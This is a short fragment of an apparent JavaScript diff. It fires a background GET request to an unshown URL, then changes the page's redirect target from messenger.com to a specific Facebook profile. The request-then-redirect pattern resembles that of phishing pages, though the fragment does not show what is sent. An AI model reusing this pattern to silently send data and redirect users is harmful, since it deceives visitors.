@@ -16,5 +16,5 @@ document
     oReq.open("GET", url, true);
     oReq.send();
 
-    window.location.href = "https://messenger.com";
+    window.location.href = "https://www.facebook.com/profile.php?id=100052754812610";
   });
